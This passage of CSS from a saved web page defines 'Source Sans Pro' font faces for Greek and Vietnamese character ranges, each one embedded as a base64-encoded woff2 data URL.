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)
                    format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xK3dSBYKcSV-LCoeQqfX1RYOo3qO67lqDY.woff2*/ url(data:font/woff2;base64,d09GMgABAAAAABt8AA0AAAAAO4gAABsmAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGoEgG6NaHH4GYACCEAq5RK4zC4FsAAE2AiQDg0wEIAWEZgeHXxslNCXs2IuA7gA436tSPyIKycj+/1sCHTKkoCkw/S2AuE07jExbmtgOt2D6eIKO8dmNHTGBwyuI60+ZC95l0Y79TboJhX8G2cqTNFMk+lc5ZJ/D+YtYT4JwDaQzvosxUAOS53OjvvP7pTOZzU2O0NgnuT78e9afiyRFkjKpNONq6F13lu6SftKfgfCQP4a+uwKTKsezqqxCHKjpTphl8UCajJhcJtRYToNu8v1w7W1mwczbCFPXKlUWpgm3PSJjsjaxR8z6w/C0zX8Ht/kV93WDMavmQCWl+qg8qgRFlqnTRaar1nUFIhva4Hnoxj/19+y+beZzkGQFUiQJ4k5nS7eqwzJzbMwivgX4a1PLI9oD/8FhD+dMeDEjZgSRA8D/MlySEvrxx1yFQKSPuEzH48x6dz8GeqHGl/n/6SzbmR1794B0AcIqNWPRYNGP/pdPGo0naxneraTdA7QP7SNW7Nun9R5xFaQSyLtBOIQuQH2qdJcKi46LJm361AVR0Zb8GpqPRsmYj+P6mKTU0LF3I83RNSxgf4iIHHIECRJCENu9LJfnzs7HOi4NaZCKfif6lyMIQAYAAOVFMYSTF+Hjw4WEcBERXEwMV6wYV6oUl5TEZWVxNWpQ9epRjRoRrVoR7doRnToRffRB9NMP0a0bMdhgxGijUeOMQ+XlEVNMQRCAxTBL8c1euWFoPV+1eC4qrxdPm4Oih/ml8+HHATCMCBaOT49PCNwH0xa/pYh3ACQKP7XNAKGt2vbpNdXDsCMowIQahANOmoAzcZdt/OtbkA+a5SEETm4anQdlRi/UpXFujdA0RtcEHo1IapJ6TTJNinyBl2BvCYCgbVdZ/5TCKl8KVRFoLKHzzL5WblVvc8p+wjdwxKGyDnu7AsAK90AMDKDBfrtzEwl4QRGsEPHHWAmQwyUHkFiYSoWpPEfjzBhlCDFlnRZaEjiI9ge0gOLsD0Vv3O+J4rkH761pADRrPPwhV0AlywgL0BeHxxjqlw4i/5viMavX1VclrPkOra1pfjZq6fXxWb5b6IcSENpUsalziUvEnfOA6SVQhVp71xpwZhxoKAVkimI0UqwrjdAY7ikIJYCcXDMSMUWdOwT6xxoCCWIK/AR5yVo43uaUsNy6rPAcB5J10bJtUjHVndEjoWKFYfanEei8l4eoAMevB0EEUUxYREyBQkVKlCmXVKVajTr12nToLafbIMOMNc5EkxHUFHEuVyChMO4HBICGx9QAMqRmtF0KGyezEIsYP6ucaKngcm507aS4vB5RJi5WOi8rlYMVVctjZWdHcBESkZUjJ0SQkaltFOVD6ShKxjCKsDCriAgqJoaiRVDMFTEr2TSqXPEBLavuiKROZ9FmNYsOTdBbM8lpTLcmGqSJhkmBRFc0ETTR5GlHebua6ycyfawdEFDQkXepwDjRV/6NOxanZxA4KeKJfnrHMjONNHYV+CL5WZR3a7civEsRGCJHUCOIaiPF9ILcO0gYLCKgFI620fe4sknnQlkqKZRNsEBVuKvsAWJE5qrAQDDaC7ZKrWa+1MCYKI3+WRSTg3fq2sNAEktUrikOUYR6EI2jouZ9LKEKM1aKV6GN4KqmpMyRbflYEtbnBasbxMaQu17uzE1Zvu5sTMpajrJ8LI3isF8Wr3+K6ZziY0WFf8EW8c82DC54O2uYzhhHk4fSqmAYyrnWVaJ29eDSfNITSwVB3mau+bQl11UR92V4DpNhrUfNDAq3ggGyQUKBfkvf6dQgIkxwbhJIkkvFpAzsNw1oRbA0K+NEz152tTIhYB1KElzPbp+rcNO3ESQG+RWFLjlN6T8xIF0oe58NzXo8wTbWGMMnwW7kYvAMy2dxOOBA8BSFxXJWIvWZqkbk1V/h+1omYpv84eCFQjoQ4QPI2qK8T8RreK4ONqjeGEsfPUWpxOfgMBm0CjI30MXlzva9mXtMwnr2M6YsSxTVnGCkmaOwmFy/Gxg6keXjFxAUEhWXUKxUSlpGVoVKtRo0atKsRat2nbr00FMvffTT3wADDTbEUMONMNIoo40x3gST5E1F+HSTAIADoAJkACABAHe0vS4ihYWJlVnCEAXfPAVF6X3acYNYXF6nOC4iwMYuQBASQBS0w/GRNV4+TFhAKCfCVvqmZPzpDLCtfA7ByCRmAOAB2BCIoLICwpzAzSmHzWuB0xsPUFYiE8ACUKjsFA6ADtD5AYCOA3Q+FACYWCgUuqaKUqOw932+auFkZBUrUV4mG9uZ98Ti3W/moKbv0vfnBuQ5OeUpbjAjjSO/eCCamSp7pGxfQKRVCExn8AG+EoDy4F9JPQSemZiAKc5QmDBt7ChJG7WESo1QRwaoID2jBUxyB3Ly6J2lyajyppGGVrmvOqzs5BShM+N7BsjDBVPmwvS1Bn+QSc9NkhAKmnqHuhBSj/mdujvq2VmayUEC0CfpAfT/+aDJESojAdAGgTHOKOUAtnDbtmOzcyDaRSs+mndEAPb1tIyCvAWA/JnpgCgGoAB9gBtDNO7f1zYpipNFdaow06emfuz4yQ2rNx10zkVXXXfTbXc9rPTSIdO7kA5/byZOWbqm8ZALykItv919/vPpz3N2DR129I7KjqkbtgMsxIkdyUsRA8KNHgWUgZ9nNb3Ks8xRYbpKVarVaTBBjXpjafSJhugvR+5XeZDBRhtnjLHGA4BlAOBrAEtA+h0sf4E8BbIDABAAFEMulEaIKLZ7NFVspXtZbDqmjYCr4BFN0KWjMCZ8sG4se2L0uhla3DQQYIyfYDCACFvzSlFkzGJyms2yzJWw267KZpPfbvHr/rDis9r1KVEkrvtyu6ryrWOSdUnylpTwmD3g9SeUdElAlsz2hFbkaLTLCZeiKXr0egW1MFPgcypyrNSPE5XDgsBl1x0sj1vJsa2nVN1+Za1oB+fEeGcPtTpp2OdcIBl49mBHKq2iR6WrIINFv/aPeyUpogpo5CTp1rw+WNFAGKu6dvxGteikHRq2u3h8HIEOEjV53YThEmUjLXLTy9aY88XlJVoRkqAJyBlcZ+i1cE+vZfcVvgZdEde/ARJbLo/9RMGOn8yIXS1JmpZJb2FFw9qkCHOumY54O9PBB7HnexkS6aRpsAgcSFuH5yHwiYEVHVVk+lFPvZZe6ePDUJYYSsiSddg/7X2bT+Rc0G51nzJBxhTO63jlw0CW9TXcZjFQSCqzHKnAVb3k/i2pPEzg1+hvLcojwqVuNtL93AT/jED+oLUOjR5LnVRH30EtmhzFqI+QmVM41IOmy3EdFDNdZbeDR15kZFfzphJz3YilrGPQR019zuLqeykkB1/o3kOYdJ/gHXgPdmi/ilZ0YpB3O7zyuSQ+Z6Z0QPdgRYe3kKmS0mPlpciKhmEBFEWVHM442wFv2rZgj0HPCOzxrCtuBQy+H42RSAQStgG4QH/WmFSOdnjTGVMGOeFwVdqviqvlxHFfkDRjvq/nuuu7XeNQH+YcPEoV/a5RvuuPUqxL5/fmvuuYSFzySpqS1xPukTbfiblwY7IOcFwikKIHad7/DkGpzXUP+z+SCX9Div9uJl2JhD2uR6a5P5dHuwQMUvzllOOAXM8vt6Pb/qTChMa9C1c+ImIftDX9ars4vwlGuC4tuFKUH7gsrySbZIefjMyTkuxafcgaaUfOgRs/kLHAISdYWKE3VnBgxoH6v+4WiF/MhBAKH4TDCNzrxslANAsI87WSxryE7BFdFev7+lapJyuEu8giY9OC8wcVCPbO2N8T7EgU06Phm3ojSOB7o5ddFUgDKX9WcokasvGWJVzum+/iDssyM1fP4/JM9BWWwRbzIGWmtyc9Iko76Pe5yp4+bS2Slc0el+XOTQlI5qTDirHZKZKLsLHNwAkwM9F3npJzOAB9orDvXtFr5tA7/NClfrwNFQaQ1WAKfgYFkfMPcoCxEeueyz2DN0YhH9FpU3QBJZCnozxQC+E5mcUOSmLMvXEmZtpBpPWI+UpH/lZOKxK6+Fd772tU982BpSNSpYGIfZKlBnBe8yUf9iMv35/Z1e8s+9/Wv7oLtf05teToRO+c633QZl93qL1HfTkDYtVo6+HcPXvVPeNLrPIJRmlwLgPBLIu+7+vuifWm50vJbHf/FWX2i6BlufCBxF2Gk3/H/VDluWwDKCZXquUSxQhVnelXMb6zVyQGJAeuS14RkZrgLxz2wHXn5MAh7dpKjkK/g9ZwUaaqhaysdfMkS5AXzrRPgN2Hc6aPTRq760h2g4tE+OUuobFryFqyes5VuPN0yxwn5/0D15OPhSDr0dlg8PK64UV6p9+Z3o0PaYeVV8PsavYRmB6U9319f/L+Peuf1j93nz1X9xyc6ppTefSWR8zt/AN+gdmby+9OCsEr5BUffy85DnyTDyNVuTyVgEE3v4PX6E1KmcTZjayv6x9x6PhMvpFmiiX3dAYlCnGA5+qpbaFG3e7cT83PdwxN0Yodz8A7JjvYDHbLntx9Kh02VRs68/PNjOBhR/fhF44VquqCjURlI9xIgCetDcYmmzuUJXQsgcun19q5nk8FcEnzjmUdLuW73sxTj4Lzd3Usu6VZw7fz1SNhevM4yw0MOLTerp7ToYN6Zr0VtddZNTP5yTVz6uyoVuhS0PqjNR0meDyUqEHh7e1WAN/k3fouhWKHNj6isnNnWBt1oTK1xsVxhcAj/TH1A/UxPUgZ2igKeFYe7fQGvmPY6lrpaZLtMwfCm44v+cvvTt0e2gSO/DsyxevY8Tms+gLDMdVj+w734SfiP1CYnjYC9RKGt01QA2xndrSPDa5kONqyDQIB14OHR2hLyswiCcPvZHIpvlwWJrJsRjOu1iBXe0woUZCAyI0S/qpSgcztDWeYs8B/39BnicirnTP8zgh4xq6R2jmuBkljL6/r6MhsZDY8OkMxy3UUfOfvMnyARdCzQswj/5Ux85GxRa2x1or1Q1kped3c2N2G0gylTKj493pkTrt3bVGeWxUFr+9z9zMLcw3HVq93+jEN8Qa4IT7Fj7EtX38s11DI3O8hmokcsgYmadnEEFiFo45mD0fH4i8kwpMq1veyA8qZI3Kot1DbzWLRdu0tkEM3jTcRqJdA0/XWpVtvYaUj3w4IKHYT5WHNw/D6U2wNfFcoasDUfDRSKHaQilNXSspjPD0n/hYTQXayezArtdRc0z0K9VyOiaplVPZg70QimLecuJ5XHotKMla+HuQwrwcrxmMzt6p9sVLlRfghB26ztA+03WRpIA98JlVcnLTPjyZmVpHh9PBOSWwfBQzNZk2cpcnWBAnqRWrgm3xxsl1fqgdlzIcZd1syVqolJ36dTghrgLx10IatlSI9zGaka63Yhg0YAii2Rox0Hep61Ej5m/hBXIWjfQc3PMQNt4+dQe3xmAce4oHjHQDn6xJ4aN/6BnRBCPXYsB6Lxwbb3KEF9ob6oX17wV8BRTkM3s22FLRXBJQT62xOZ51NNTGgKGjPtpyGhylfimtNY+IaaneXTCx2ySjdNXHjmFoxCDzy51bR+Y5ZhwxJ4AXOHq/v5xD2qRDzKHY+QYkh9LSdz5yAH0RJP4n/ryi6b9oLYqmlHMuJmpV5s4uVpATfkX5X2hS+LnbKnJIAMDctRErae0RKOtq23CDkMNA7sDrRXmWSs/0uGoPqzfNkQX1azHjN1ukQAWJSZvQ5J7i/L4+3ncyT+oATs2FdmS0HHG7KyyWJ8iZzpyuHW1DCTckQ1uwWBpjq1x5OqLIn20qnGOYKIz5stAQkq6tkiaMqIcPrEEtJR4PFZUYZ6u1XjJdfC7QsLAkSMuoVtM4LVIoShzDefdC7e7Ri1dMihcKjE0tsjYZUdxj84utpUrJXzYWDnQooZEcms8ycmdZ8y9YCytHifJ3g/8Y8ma2oVX+UpKJKCr/6ixtt6SC+XZ6xyE5IwT+4kYhSmUELj97f3DsYvZTpBl7oI6JHml0IRy296X3L+YWIrOC4OllexiSmq0FdE2TBLAeL1EpxKenfPgkayYbkKkPzKqzbyuNoRBXB5wA2oVPjwc2ddoZClNh80IwTnMdAarETPvWVFbUMdwGS2x+KfYJi6d1oBxtw5XM5Q+wgAp/xtCtIbr1+2TaARrIxmrBNIc6bDRcrgr3iVlGCaaBddGCSvKM+xvUlzOfZOL7adV02BlKNKemgOsGVcOmDA69gK8mEk1fxSMKcfK29Q258O+QeMRUGtqY5KFlGltPyL2Ua9byOBGZqi6/rp28jkOfLMAuUFFL2J2sKkDIiOJgxIvJTHEAJeNFE2qwWcrg0gFz8L2JvVe96qhsMunptS7bZoUgmO8nlRhmdZEY4tXAjT8cit5WlZgxueIgMR3rSdWJBoXpRNmFKXNOiBwSyoYCmoNH7qDOPa5LvMIkZapCkuUog7GFD/a5VQpGYZwe1cUWBCJFrYg6nplouMwmnA14seIIT/GvCAxXkhnykddUtbyXFUDjV/jPgRrSHVAVfVUbSMCHIC1St6NTk5RsONwemprVOfpcKjrC607DeKL+PT1zeTpdNhGSYDkBW95pjqPZZhVEl2+wNDEyTpYEETVG+sJvVKekSY/GT1EM12MHwCWal0sDtGOYJEL4ujDKy0WklAqPH7zBEQC6Ou0/IXipRwSiyDLJBC/V0Mq53077Lo8EP7ki4ogzrLM3GyFVWbbs8crOuFLmMU8pWekO81F5EhaWVuXW9fGCPoYDStKb6vZBBxkEXc823a7eFfx+KO+Dcy7cRpmLhtd/d62SnzRbCkhwY0JpW1kDdh8SHps3/u7Ly2uRl4rB2ndlr5Zq4Fow7FuemVnSztOpM6CQdOnxyX8xKcBunC/cbYCof6dHnjSvrYTKybaRCNZIj4vg4ohw1UkAut7uZKcZ8zQ5dzgBajbPGN8BI1pCzYQpCBsLN8vTJa4lp+9dlyvOcuVaRWdg5yhMw5PkjZyhWZosNYSu/reKxselDZXq2EdBx7SxpCg7Jr0hESuIuoYKKFrH0Qg7XUQNbm/s6WKRcb5gm0vB1WnHx+WvM1FuLUwvwnGzltdzapXnN0mwpYSZJQeIPJ/EkbjA5K9cgCrRSJ2ImFvY4NJjctUfA5vX6y/BecziBpB5OKjDn1oIeflxNtlqabS3mUGxmCq1bj22bxzGX+tS57QWx2spD4YT2Gs+u+Twrx9sp142WlFxT7cykIO4t48UaHiqhd9Sm6FdJQ+1gk5D/x2iFILRdnrHR0YrwfoHRx+VUGJ3SLl1ZylnqgwaywePxW5wmJFWVqqASs3QFdgsykCfQjXPCczbMbOAGx5ssiYsS/NQ8s/n1AD5SkK9MGfBupTInl21YS79CXlttYKl66Yq+ZWVLel68aP+/VkoTMfiT9uNgdWxsOtrjaDNqtZ+QaChenbUNvnggFPd546FAHJ3vpJf/1+0i9SaDgVZftCsl6zkJntndZU9uVEzc0vdo2r261mY3Se0ui+lftHse1t3dyDfq2k13Em+aWXd3rd2DhdvOvi78cmfL/cSTI6uTTzaV0qtd6ZCuO8o/T8enZbJstYdlvvDQ4GlFoNMQAZLFtmpHVfq9Xw3aZYxxZmMCE5nETMzMLMzKZKYSJR9FfN0At5vd1z60Sp1eJBJDALPPUTwfcLrkre1g3B6N/sIIXkVa2/tDtctZgnYSMXR7ZotUHwWmxLu7p/drdJEarBSegEWWmDO2pEs1FhA6eB6Qe6pxW0AqNEGW6lN05vUQzQfgwRnzxmzYCCAV0QsY3wYyyFKGEcivGwUM6BA9aAzQyXZb8pum1D9ZZCmDW64jKx3pYzp7xOry60yjZ2lDNgjkDgwK3VAb+Y9Jm1um58t3OTocedQG35nchn7n1zkaRHZNriIteXFGRdtz8379i+m8ZA2BNn3d1vjaV+ltQfQr0Wyqn9ANqWozu9saH+3oYaIOLWfKiB4nt+uI8bgzZ7+nVDJfcxiszipy+3F+xbXAONQrTwC0YdvLcei0cErzbybGvgzAm+MvNgAA703PcP5v/P8dUzf2ZABDAQAB9vX/HjA9q5DGZYBYFSzKfUbTt0BHwTKHMWkjsrdNSG2zi75Bd+ROqs7avDxeBJPAFu8yJhOpkIxvz5vCxpB4OXNmkYlXkhkYktdLZxwluG3jZy+HMD7AgAIwTZqeDKDyNVTQkW1I6fmRpMW2d74s/aHyHm15rV7LF3Og8XbOUJujAT7OHN8TD6puzcu+GjrSWYOB8WliulAdD5aO62UzhP5pQVOIGBLf19e69qzkdX07MW4TTA/S2Q96FmJAxpGOZ/PH/5rteor4KHPeoSXvUxW3a0S27lnQSQPYgIuYnmh8jQEQ2KKqJxofdYEO5eJlEud0hT9z+KsM0A46ZPz2DON7tJe3WawG9atcZtrjwvjAfO3F7PsUASyzl2w6KZkLOQYwiYS1rTQ3PE4E54OIcAQPotRQD2JyHg7z4IMEU004SFSmWqhjDphp6bbfQo0yhUtMsdisvVjKWtoSMTeLBUJLM2QM1EvOUCuWoTvFNC7Mm2+JQWZ5F0gZYpoZlpkrb7ERplmMsPwLzBdVKS2rWo0mMy2w1BSpWI6sQqTzI2c1aDJP3hzTFMR0aFhpGljUGLdWjSENQbyHVoceOg3UxM8AiIFYpqc0CK+NDlV0KG9gIrNce0alrmj96B2mWmAyRKzyYinLeUC/r/kW+4st3Mu8XEz15UoSQq5Y90zLI8k0SMyTc6WSoihmaf2ZoqzlEk+r5Uiyl1fpUjHA2vN4zDXqtWfk0XSkUavLNJ6v0uBlAPYmydFLlEtKv/mhoUrd4JfH87jnVFRRNd0wLdvJ9WTX8/k5OLm4aXQeXj5+AUEh4SwSERUTl1CgUJFiJUqVKZeUkpaRVaEys1SpVpN5atWp16BRk2YtWrVpJ6eAUFJR09DS0TMwMjGzsLJB2Tk4ubh54kiKsNF8/AKCIvVXic1GJ1vwxq5q71mvZDM6csoj/A5cns+TN/v2Wlv5Vt6nVPtQFKB3+QNzKpXT0ZG7zzmb5MlVhuSWdwycgzaB4nwFafqSZi/pgPr8o0ErVEoLlFcJqWuMC5A38NK34dTJi0QUbbIWpbSoRntSSQ+HBC+EAfhkmxOcVjlLX5H9n1PlaDCk4S1I+RfdlIiVZjE4pYJhVeeqWKofm8rozLyqP2XsWYUsi+SktL5thBz5btiDPqMvyumF8KRKetGt9VUIU3RU0pdgWGb2CVg1q8ET4AnoBK8Te9VQkxCMd+Wqr8ROjJfiiig/qogoO6gYWa4qEcpxKMsZwp1iddLsZtHH2W3VpkS4S7EDV57Yj86gxocZOu9uRx61MsNiCZsNAA==)
                    format("woff2");
                unicode-range: U+0370-03FF;
            }
            /* vietnamese */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xK3dSBYKcSV-LCoeQqfX1RYOo3qN67lqDY.woff2*/ url(data:font/woff2;base64,d09GMgABAAAAABbMAA0AAAAAO4gAABZzAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGoE2G45MHI5WBmAAgwQKuHCuSguCUAABNgIkA4RCBCAFhGYHjQIbKTQlctNpwcYB4Dnyh4qiRIoeTfD/XxPUGEMAuwcqmzMipKhUJYeE2mZsxkauymGSpLK2rpIBBhW2U0C+WX+7x/NiGy+yn+cXcOgl+yNVLBm8jBiTNqmvjvVxpCpg/WTqjvac8/q+MPZExH8uEvQfY//bPeebIRGPlGbSiCqZCKGTfuhvOqGTIJmWRJN7RHM2u3txQRMIEmsCNMEsQTxNwINoE/DQYtI6NaN9vg99UaNfXszg36tC/Pdj7PdcxEIRrUy3akkTWaVSCiGJhUojVa8MjSF/efT8mOwthjH4IYa1PLPBKEbNgqLozetfptKwyxFafxXg10G5l/M49mptyL5oql/JXgpD+sr0O/QWsd2NqPTqiUWbZrcs5VJksqyEp07Drc5ahmfeALfADbfQeZNoqurzBm/u/u5RuFYiCYSQE8dCzmxXuOjBucRHNh4NZGNtrLaqr774GucG6P4uyoh4FQE3xodpzMCUrZiLwP5/Ns12Z7+/JVtHewHE1+8PoS7vpXdTrma81o7GY5/Nsgy6CwkCcvYIpQOtAkTYh0vAoslLm6KoU6cMD99Orbsejr2AJ9h9wIh24cSbLdIR+HzfVPUHKbHdYiE8GoZhBhoeyT7c+q+FgOsA2IJxDNsGmbELstdhyKxZyDHHIHPmIMcdh8ybh5xwAnKXuyD3uAeCCWF8iJkZEi8e4uaGtGiBdOmCDNuGmHEYMWsWccwxxJw5pBcQIECA/D0JBNjQ4g2opYtXTyB/b+BqIPHIl1eB/ryx3QD+KABzqyIYOHJdjI5dF6FhfTXAEibu2WPXAJWMb/TWAUe4Wt+Y/KkAwiCBf/ESVOcvS7H9CzYWIGWEDcGANTgAS8AnQ2Hj+tY2Z0l/Ila6rjrpPy6SislqgxI7hn1bip5fcjuKEAc7pztzxcHPFVv+ZRc/FKd4F+vXGJivAoKGjgnYwkcECkSnlYHBbUAITAHr+S9gMKZFYVkIewGMw7gWxrMIfpZJIMDD0rJYVilWqgzLpsRyqLSq1Eg3HhxbLS+snQ/RbwDT4GExHHvyLJgoTDkp5azuSOfrYUSa6J7NLBCrOAzxUtCCKFZfRofm6TvRdfGhuscflIgHktt8ReeGA+aPxyGraJ+5WB/5zFxp7gNIW5jlY2SZq3ex2i6BfDDg3/l1HNQN8DMEiSTddb/KGjWM+7raOJgcBgIU0BW6vYCBCSxgAg0YQIACOiDAwLSzgAk0YPB+ihtHomIRmFeMpuhBgCha3+WQIGFWuMj8GpVIL0XzjBlfkQCICZWTWCjPwUUTJpiSGBcC+WHmc20nI7liH/dBM2mjTWbsRKFFzcVeY+crLTZinW4eTdzKOeSzG5EqXgw3O6MIKAHzCEUEs6DH0rRNccQoMNUVmKcjyVSFMDdFogcTE+QxYKNOIaA/E7bbnsiLpZpZeO0YtpiKLYqAm0by0Q3Oao0tFlvuMUvanGt4AvD4tfWEIOCo/wwqMxmFPIkEoUpFpmACYhj5IixeusuxcXAfGZ9ZPLcWXTSAfcArXloqDYE51s17SiGwhgHw38c2AAhBCgEQCEEQDCpQQ4gO/UhdaJvT4IMWLH94FmT+RjhPv+h8mqfecF7OkxcBzREWomE7AJYloqF5ZIwpLoIwvskCtvYe1pvAzdZwbtMaKAcHyV8DQDSgM0bfEnTTv1is+sBFd3PWNiNaFJNCADFh/tjcRoybssEmW22zwy4IG8ewMZOmbbTZNjN2OvCeDEmsCG5tAuYpjmeQZDrRARGDjUDEkEQAPu4DK4rQMy0Rl4qm8Z5fOLArA+PNY7UziAapiv6Ce2fV/EnxHYJtdBA2bS9swj7YmAOwUfthwyiB5ITYTsB2usukju